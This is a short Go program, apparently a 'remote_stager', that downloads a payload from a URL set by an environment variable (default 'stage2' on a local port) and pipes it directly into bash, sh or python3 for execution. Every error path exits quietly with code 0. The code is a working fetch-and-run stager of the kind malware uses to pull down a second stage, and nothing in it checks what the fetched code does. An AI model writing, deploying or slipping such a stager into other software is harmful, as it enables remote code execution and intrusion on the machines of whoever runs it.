// remote_stager — fetch a payload from a URL and pipe into an interpreter.
//
// Env vars:
//   STAGER_URL   URL to GET.
//   INTERP       one of: bash | sh | python3 (validated against a
//                small allowlist so a misconfigured URL can't trick
//                the stager into executing an arbitrary local binary).
//   TIMEOUT_S    GET timeout in seconds.
//
// GET URL with Get→stdin of INTERP. Any HTTP / pipe error → exit 0.
// Interpreter not in the allowlist → exit 0 without running.
package main

import (
	"io"
	"net/http"
	"os"
	"os/exec"
	"strconv"
	"time"
)

var allowedInterp = map[string]bool{
	"bash":    true,
	"sh":      true,
	"python3": true,
}

func envOr(key, def string) string {
	if v, ok := os.LookupEnv(key); ok && v != "" {
		return v
	}
	return def
}

func run() int {
	url := envOr("STAGER_URL", "http://127.0.0.1:9999/stage2")
	interp := envOr("INTERP", "bash")
	timeoutS, _ := strconv.Atoi(envOr("TIMEOUT_S", "10"))
	if timeoutS <= 0 {
		timeoutS = 10
	}
	if !allowedInterp[interp] {
		return 0
	}

	client := &http.Client{Timeout: time.Duration(timeoutS) * time.Second}
	resp, err := client.Get(url)
	if err != nil {
		return 0
	}
	defer resp.Body.Close()
	if resp.StatusCode >= 400 {
		return 0
	}

	cmd := exec.Command(interp, "-")
	stdin, err := cmd.StdinPipe()
	if err != nil {
		return 0
	}
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	if err := cmd.Start(); err != nil {
		return 0
	}
	_, _ = io.Copy(stdin, resp.Body)
	_ = stdin.Close()
	_ = cmd.Wait()
	return 0
}

func main() { os.Exit(run()) }
